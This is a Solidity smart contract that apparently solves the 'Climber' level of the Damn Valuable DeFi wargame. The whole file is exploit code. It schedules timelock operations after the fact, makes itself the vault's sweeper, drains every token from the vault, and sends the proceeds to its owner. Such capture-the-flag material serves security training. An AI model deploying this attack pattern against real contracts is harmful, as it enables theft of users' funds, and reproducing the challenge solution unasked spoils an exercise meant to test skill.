pragma solidity ^0.8.0;

import "./ClimberAttack.sol";
import "../DamnValuableToken.sol";
import "../climber/ClimberTimelock.sol";

contract EvilClimberContract{
    address token;
    address vault;
    address owner;

    address timelock;

    bytes[] private scheduledData;
    address[] private to;

    constructor(
        address _vault,
        address _timelock,
        address _token,
        address _owner
    ) {
        owner = _owner;
        token = _token;
        vault = _vault;
        timelock = _timelock;
    }

    function setScheduleData(address[] memory _to, bytes[] memory data)
        external
    {
        to = _to;
        scheduledData = data;
    }

    function exploit() external {
        uint256[] memory emptyData = new uint256[](to.length);
        ClimberTimelock(payable(timelock)).schedule(
            to,
            emptyData,
            scheduledData,
            0
        );

        AttackClimber(vault)._setSweeper(address(this));
        AttackClimber(vault).sweepFunds(token);
    }

    function withdraw() public {
        require(owner == msg.sender);
        DamnValuableToken(token).transfer(
            owner,
            DamnValuableToken(token).balanceOf(address(this))
        );
    }
}
